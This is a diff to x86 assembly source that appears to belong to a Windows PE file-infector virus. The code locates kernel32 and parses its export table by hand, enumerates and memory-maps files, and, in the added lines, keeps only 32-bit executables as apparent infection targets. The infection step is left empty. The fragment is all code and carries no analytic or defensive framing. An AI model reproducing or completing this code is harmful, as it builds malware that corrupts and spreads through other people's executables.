@@ -103,7 +103,8 @@ loop_find_kernel32_end:
 	; get PE header (base address + offset from the DOS header)
 	add edx, [edx + 03Ch]
 	; get export table
-	mov edx, [edx + 078h]
+	mov edx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).OptionalHeader) \
+	          .DataDirectory[0 * sizeof IMAGE_OPTIONAL_HEADER].VirtualAddress
 	add edx, ebx
 	push edx ; save export table on the stack
 
@@ -270,6 +271,24 @@ loop_find_file:
 	call eax ; MapViewOfFile()
 	mov (STACK_STORAGE PTR [esp]).fileView, eax
 
+	; get PE header (base address + offset from the DOS header)
+	mov edx, (STACK_STORAGE PTR [esp]).fileView
+	add edx, [edx + 03Ch]
+	; check if executable
+	mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).FileHeader).Characteristics
+	and ax, IMAGE_FILE_EXECUTABLE_IMAGE
+	cmp ax, IMAGE_FILE_EXECUTABLE_IMAGE
+	jne close_target
+	; check if 32 bit
+	mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).FileHeader).Machine
+	cmp ax, IMAGE_FILE_MACHINE_I386
+	jne close_target
+
+	
+
+	;;
+
+close_target:
 	lea eax, [ebx + (UnmapViewOfFile_str - data)]
 	push eax
 	call GetProcAddr
